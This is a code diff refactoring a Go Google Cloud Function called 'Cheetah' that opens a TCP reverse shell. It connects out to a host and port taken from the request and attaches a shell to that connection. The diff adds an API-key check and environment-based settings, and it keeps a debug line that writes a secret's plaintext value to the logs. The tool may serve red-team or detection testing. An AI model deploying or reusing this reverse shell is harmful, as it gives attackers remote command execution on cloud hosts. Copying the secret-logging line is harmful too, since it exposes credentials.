@@ -9,12 +9,9 @@ https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e
 package cheetah
 
 import (
-	"cloud.google.com/go/logging"
-	secretmanager "cloud.google.com/go/secretmanager/apiv1beta1"
 	"context"
 	"encoding/json"
 	"fmt"
-	secretmanagerpb "google.golang.org/genproto/googleapis/cloud/secretmanager/v1beta1"
 	"log"
 	"net"
 	"net/http"
@@ -22,6 +19,10 @@ import (
 	"os/exec"
 	"strconv"
 	"time"
+
+	"cloud.google.com/go/logging"
+	secretmanager "cloud.google.com/go/secretmanager/apiv1"
+	secretmanagerpb "google.golang.org/genproto/googleapis/cloud/secretmanager/v1"
 )
 
 func respondWithError(w http.ResponseWriter, errMsg string, statusCode int) {
@@ -35,13 +36,26 @@ func respondWithError(w http.ResponseWriter, errMsg string, statusCode int) {
 	fmt.Fprintf(w, "%s", responseJSON)
 }
 
+func isApiTokenValid(key string) bool {
+	apiKey := os.Getenv("CHEETAH_API_KEY")
+	return apiKey == key
+}
+
 // Cheetah establishes a TCP reverse shell connection.
 func Cheetah(w http.ResponseWriter, r *http.Request) {
 	// Audit logging
 	writeLog(1, "Startup: The Cheetah is running.")
 
+	// Validate API Key
+	apiKey := r.Header.Get("x-api-key")
+	if !isApiTokenValid(apiKey) {
+		writeLog(2, "Invalid API key.")
+		respondWithError(w, "Forbidden", 403)
+		return
+	}
+
 	// Grab the function timeout
-	timeout, err := strconv.ParseUint(os.Getenv("X_GOOGLE_FUNCTION_TIMEOUT_SEC"), 10, 64)
+	timeout, err := strconv.ParseUint(os.Getenv("CHEETAH_FUNCTION_TIMEOUT"), 10, 64)
 
 	if err != nil {
 		writeLog(2, "Invalid request: Failed to parse function timeout.")
@@ -49,15 +63,12 @@ func Cheetah(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Read basic secret to produce normal audit log activity
-	secret := getSecret("cheetah-database-pass")
+	// Read secret (if defined)
+	secret := getSecret()
+
 	// NOTE: DON'T DO THIS IN REAL LIFE. BAD IDEA TO LOG SECRETS
 	// DEBUG ONLY: Make sure it found the value
 	writeLog(8, fmt.Sprintf("Secret value: %s", secret))
-
-	type Response struct {
-		Error string
-	}
 
 	host := r.URL.Query().Get("host")
 	port := r.URL.Query().Get("port")
@@ -89,7 +100,7 @@ func Cheetah(w http.ResponseWriter, r *http.Request) {
 	timedOut := false
 
 	// Close the connection 1 second before the function times out.
-	time.AfterFunc((time.Duration(timeout-1)*time.Second), func() {
+	time.AfterFunc((time.Duration(timeout-1) * time.Second), func() {
 		timedOut = true
 		conn.Close()
 	})
@@ -98,7 +109,7 @@ func Cheetah(w http.ResponseWriter, r *http.Request) {
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
 	cmd.Run()
 
-	if (timedOut == true) {
+	if timedOut {
 		respondWithError(w, "Timeout: Function timeout occurred.", 500)
 	} else {
 		respondWithError(w, "Connection terminated from client.", 500)
@@ -113,16 +124,14 @@ func writeLog(id int, message string) {
 	ctx := context.Background()
 
 	// Sets your Google Cloud Platform project ID.
-	projectID := os.Getenv("X_GOOGLE_GCLOUD_PROJECT")
+	projectID := os.Getenv("CHEETAH_PROJECT_ID")
+	logName := os.Getenv("CHEETAH_LOG_NAME")
 
 	// Creates a client.
 	client, err := logging.NewClient(ctx, projectID)
 	if err != nil {
 		log.Fatalf("Failed to create logging client: %v", err)
 	}
-
-	// Sets the name of the log to write to.
-	logName := "cheetah-audit-log"
 
 	// Selects the log to write to.
 	logger := client.Logger(logName)
@@ -140,12 +149,18 @@ func writeLog(id int, message string) {
 }
 
 // Secrets manager access
-func getSecret(name string) (value string) {
-	// Sets your Google Cloud Platform project ID.
-	projectID := os.Getenv("X_GOOGLE_GCLOUD_PROJECT")
-	secretPath := fmt.Sprintf("projects/%s/secrets/%s/versions/latest", projectID, name)
+func getSecret() (value string) {
+	projectID := os.Getenv("CHEETAH_PROJECT_ID")
+	secretName := os.Getenv("CHEETAH_SECRET_NAME")
 
-	// Create the client.
+	if secretName == "" {
+		writeLog(7, "CHEETAH_SECRET_NAME not set. Skipping secret read.")
+		return ""
+	}
+
+	secretPath := fmt.Sprintf("projects/%s/secrets/%s/versions/latest", projectID, secretName)
+
+	// Create the client
 	ctx := context.Background()
 	client, err := secretmanager.NewClient(ctx)
 	if err != nil {
